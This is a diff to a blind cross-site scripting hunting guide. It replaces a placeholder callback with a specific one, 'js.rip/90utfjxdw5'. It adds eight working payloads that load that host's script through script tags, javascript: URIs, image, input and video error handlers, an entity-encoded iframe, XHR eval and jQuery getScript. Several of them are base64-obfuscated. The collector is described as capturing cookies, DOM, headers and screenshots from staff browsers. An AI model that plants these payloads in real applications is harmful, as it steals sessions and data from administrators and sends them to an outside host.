@@ -12,23 +12,69 @@ Blind XSS is a **patience + coverage** game. The payload fires hours or days lat
 1. **Plant payloads in every field that could be rendered server-side** — and do it consistently with a tagging scheme so you know which payload fired where.
 2. **Use a callback you control** (XSS Hunter–style server, Burp Collaborator, Project Discovery interactsh) that captures DOM, cookies, URL, screenshot, headers — without these, a fired payload is unprovable.
 
-## Payload Strategy
+## Payload Strategy — Liodeus's Arsenal
 
-Use a tagged payload per field/endpoint so the callback tells you exactly where it fired:
-```
-"><script src=//xss.example.com/F-{TAG}></script>
-```
-Where `{TAG}` encodes endpoint + field + timestamp (e.g. `support-subject-2026-04-29`).
+**Active callback:** `https://js.rip/90utfjxdw5` (xss.report-style — auto-captures DOM, cookies, URL, screenshot, headers, fingerprint).
 
-Always plant **multiple payload styles** in the same field (one might be filtered, another might not):
-- Plain `<script>` tag
-- Event handler: `"><img src=x onerror="...">`
-- SVG: `<svg onload="...">`
-- Attribute breakout: `' autofocus onfocus='...'`
-- HTML entity / Unicode bypass variants
-- JS-context: `';fetch('//xss.example.com/...');//`
-- Markdown / BBCode if the field renders those: `[img]javascript:...[/img]`
-- DOM-clobbering name: `<form id=test><input id=attributes>` (for AngularJS-flavored apps)
+Always plant **multiple payload styles** in the same field — one may be filtered, another may slip through. The base64 blob in payloads 3-5 decodes to: `var a=document.createElement("script");a.src="https://js.rip/90utfjxdw5";document.body.appendChild(a);` — same loader, different injection vector.
+
+### 1. Basic `<script>` tag
+Classic — fires when no script-tag filtering.
+```
+"><script src="https://js.rip/90utfjxdw5"></script>
+```
+
+### 2. `javascript:` URI
+For URL/link fields, redirect params, href sinks.
+```
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/90utfjxdw5\';document.body.appendChild(a)')
+```
+
+### 3. `<input>` autofocus + base64 loader
+Fires when `<input>` + `onfocus` are allowed but `<script>` is stripped.
+```
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+```
+
+### 4. `<img onerror>` + base64 loader
+Fires when `<img>` is whitelisted (markdown renderers, sanitizers).
+```
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+```
+
+### 5. `<video><source onerror>` + base64 loader
+Bypasses sanitizers that miss media-error chains.
+```
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+```
+
+### 6. `<iframe srcdoc=>` with HTML-entity payload
+Bypasses filters scanning for literal `<script>` — entities decode after parsing.
+```
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/90utfjxdw5&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+```
+
+### 7. XMLHttpRequest inline-execution chainload
+For inline-script-allowed contexts where external `<script src>` is blocked.
+```
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/90utfjxdw5");a.send();</script>
+```
+
+### 8. jQuery `$.getScript()`
+Smallest payload for jQuery-loaded sites.
+```
+<script>$.getScript("https://js.rip/90utfjxdw5")</script>
+```
+
+### Tagging per field
+The callback host is fixed, so encode the field/endpoint identifier as a path or query suffix on `js.rip/90utfjxdw5` — e.g. `https://js.rip/90utfjxdw5?t=support-subject-2026-04-29`. When the callback fires, the tag tells you which input → which admin context. For payloads 3-5, modify the loader before base64-encoding to append the tag to `a.src`. Untagged callbacks are useless when 50 payloads are out at once.
+
+### Other styles to try when none of the above fire
+- SVG upload: `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile picture / attachment
+- Attribute breakout: `' autofocus onfocus='eval(atob(...))`
+- JS-context escape: `';fetch('//js.rip/90utfjxdw5');//`
+- Markdown / BBCode renderers: `[img]javascript:...[/img]`
+- DOM-clobbering for AngularJS-flavored apps: `<form id=test><input id=attributes>`
 
 ## High-Yield Fields (where bXSS fires)
 
@@ -59,11 +105,13 @@ Always plant **multiple payload styles** in the same field (one might be filtere
 
 ## Discovery Methodology
 
-### Step 1: Pick your callback infra
-* XSS Hunter-style (self-hosted: xsshunter-express; or a service)
+### Step 1: Callback infra
+**Default callback:** `https://js.rip/90utfjxdw5` — already configured. Auto-captures DOM, cookies, URL, referrer, screenshot, headers, UA. Check the js.rip dashboard for fires.
+
+Fallback callbacks if js.rip is unreachable or blocked by target CSP:
 * Burp Collaborator + small JS that beacons cookies/DOM/URL
 * interactsh + custom collector
-Capture: DOM (outerHTML), `document.cookie`, `location.href`, `document.referrer`, screenshot, request headers, `navigator.userAgent` (to fingerprint the rendering context).
+* Self-hosted xsshunter-express
 
 ### Step 2: Inventory the input surface
 Walk the app as a normal user. Every text field, every header, every webhook URL, every uploadable filename — list them. The ones that are **never echoed back to you** are the high-value bXSS candidates (because they're echoed somewhere — to staff).
